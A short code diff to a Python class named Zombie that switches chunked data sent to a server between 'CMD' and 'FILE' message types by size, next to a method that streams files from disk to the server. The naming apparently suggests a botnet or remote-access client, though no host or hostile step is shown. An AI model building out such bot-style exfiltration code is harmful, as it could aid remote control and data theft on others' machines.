@@ -77,7 +77,10 @@ class Zombie:
             for i in range(0, data_len, 50000):
                 yield data[i : i + 50000]
 
-        return self._transmit(memory_chunker(), "CMD", data_len)
+        if data_len > 50000:
+            return self._transmit(memory_chunker(), "FILE", data_len)
+        else:
+            return self._transmit(memory_chunker(), "CMD", data_len)
 
     def upload_file(self, filename: str):
         # Streams a file from disk to the server.
